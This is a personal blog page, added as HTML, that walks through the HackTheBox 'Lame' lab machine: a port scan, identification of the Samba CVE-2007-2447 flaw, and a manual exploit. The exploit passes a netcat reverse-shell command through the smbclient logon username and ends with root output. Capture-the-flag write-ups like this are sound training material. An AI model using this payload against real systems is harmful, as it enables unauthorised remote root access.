@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB: Lame Write-up</title>
+  <meta name="description" content="Walkthrough of the HackTheBox Lame machine. Scanning ports, exploiting Samba 3.0.20 usermap_script vulnerability, and gaining root shell.">
+  <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+<body class="bg-blur-reduced" style="background-image: url('2_5.jpg');">
+
+  <!-- Background overlay for readability -->
+  <div class="bg-dimmer"></div>
+
+  <!-- Matte Glass Navigation Tabs -->
+  <div class="nav-wrapper">
+    <nav class="section-tabs" aria-label="Main Navigation">
+      <a href="index.html" class="tab-link">Home</a>
+      <a href="blog-notes.html" class="tab-link active">Blog + Notes</a>
+      <a href="projects.html" class="tab-link">Projects</a>
+      <a href="about.html" class="tab-link">About</a>
+    </nav>
+  </div>
+
+  <!-- Main Container -->
+  <main class="main-container">
+    
+    <!-- Back to listing bar -->
+    <div class="detail-back-bar">
+      <a href="blog-notes.html" class="detail-back-link">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" aria-hidden="true">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+        </svg>
+        Back to Blog + Notes
+      </a>
+    </div>
+
+    <!-- Article Container -->
+    <article class="matte-panel detail-body">
+      
+      <!-- Header Meta -->
+      <header class="detail-header">
+        <h1 class="detail-title">Hack The Box: Lame Write-up</h1>
+        <div class="detail-meta-row">
+          <time datetime="2026-07-15">July 15, 2026</time>
+          <span class="badge badge-htb">HackTheBox</span>
+          <span style="color: var(--text-muted);">Reading time: 5 mins</span>
+        </div>
+      </header>
+
+      <!-- Content -->
+      <p>
+        Lame is the very first machine released on Hack The Box. It is an easy Linux machine showing common security mistakes in Samba service configuration, specifically running a vulnerable version of Samba.
+      </p>
+
+      <h2>1. Enumeration and Port Scanning</h2>
+      <p>
+        We initiate our reconnaissance phase using <code>nmap</code> to discover running TCP services on the target IP <code>10.10.10.3</code>.
+      </p>
+
+      <pre class="command-prompt"><code>$ nmap -sC -sV -p- -T4 -oA nmap/lame 10.10.10.3
+Starting Nmap 7.92
+Nmap scan report for 10.10.10.3
+Host is up (0.052s latency).
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp open  microsoft-ds Samba smbd 3.0.20-Debian</code></pre>
+
+      <p>
+        The scan results reveal four open ports:
+      </p>
+      <ul>
+        <li><strong>Port 21</strong>: FTP service using <code>vsftpd 2.3.4</code>. While vsftpd 2.3.4 has a known backdoor vulnerability, testing revealed it was not exploitable here.</li>
+        <li><strong>Port 22</strong>: SSH service running OpenSSH 4.7p1.</li>
+        <li><strong>Port 139/445</strong>: SMB service running <code>Samba 3.0.20-Debian</code>.</li>
+      </ul>
+
+      <h2>2. Vulnerability Assessment</h2>
+      <p>
+        Conducting search queries for <code>Samba 3.0.20</code> reveals a prominent vulnerability: <strong>CVE-2007-2447</strong>, also known as the <code>usermap_script</code> Remote Code Execution vulnerability.
+      </p>
+      <blockquote>
+        CVE-2007-2447 permits remote attackers to execute arbitrary shell commands via shell metacharacters in a username when using the MS-RPC interface, leading to command execution with root privileges.
+      </blockquote>
+
+      <h2>3. Exploitation (Manual Vector)</h2>
+      <p>
+        Instead of launching Metasploit, we can execute this manually using the Python script or by connecting directly through <code>smbclient</code>.
+      </p>
+      <p>
+        First, we start a netcat listener on our machine (port 4444):
+      </p>
+      <pre class="command-prompt"><code>$ nc -lvnp 4444
+listening on [any] 4444 ...</code></pre>
+
+      <p>
+        Next, we access the SMB share using <code>smbclient</code> and pass our reverse shell payload inside the username field:
+      </p>
+      <pre class="command-prompt"><code>$ smbclient //10.10.10.3/tmp
+Password: 
+smb: \&gt; logon "/=`nohup nc -e /bin/sh 10.10.14.4 4444`"
+Password:</code></pre>
+
+      <p>
+        Upon executing the logon command, our netcat listener instantly catches a connection:
+      </p>
+      <pre class="command-prompt"><code>connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3] 52312
+id
+uid=0(root) gid=0(root)
+whoami
+root</code></pre>
+
+      <p>
+        We have gained root access on the machine. Flags can be located in <code>/home/user/user.txt</code> and <code>/root/root.txt</code>.
+      </p>
+
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer-text">
+      © 2026 zz. Built with Vanilla HTML, CSS, and JS. Matt Glass Edition.
+    </footer>
+  </main>
+
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
